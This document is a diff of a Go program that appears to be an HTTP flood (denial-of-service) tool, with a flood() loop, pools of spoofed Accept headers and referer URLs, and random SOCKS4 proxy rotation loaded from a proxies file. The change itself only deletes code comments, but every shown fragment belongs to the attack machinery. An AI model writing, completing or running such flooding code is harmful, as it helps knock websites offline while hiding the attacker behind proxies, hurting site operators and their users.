@@ -13,7 +13,7 @@ import (
 	"strings"
 	"time"
 
-	"golang.org/x/net/proxy" // Import the proxy package
+	"golang.org/x/net/proxy" 
 )
 
 var (
@@ -23,7 +23,7 @@ var (
 	mode      = ""
 	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
 	start     = make(chan bool)
-	proxies   []string // Slice to hold proxies
+	proxies   []string 
 	acceptall = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 		"Accept-Encoding: gzip, deflate\r\n",
@@ -72,12 +72,12 @@ var (
 		"https://www.ted.com/search?q=",
 		"https://play.google.com/store/search?q=",
 	}
-	headerFile = "header.txt" // Default header file
+	headerFile = "header.txt" 
 )
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
-	loadProxies("proxies.txt") // Load proxies on initialization
+	loadProxies("proxies.txt") 
 }
 
 func loadProxies(filename string) {
@@ -209,13 +209,12 @@ func flood() {
 	var err error
 	<-start
 	for {
-		proxyAddr := getRandomProxy() // Get a random proxy
+		proxyAddr := getRandomProxy() 
 		if proxyAddr == "" {
 			fmt.Println("No proxies available")
 			return
 		}
 
-		// Create a SOCKS4 dialer
 		dialer, err := proxy.SOCKS4("tcp", proxyAddr)
 		if err != nil {
 			fmt.Printf("Error creating SOCKS4 dialer: %s\n", err)
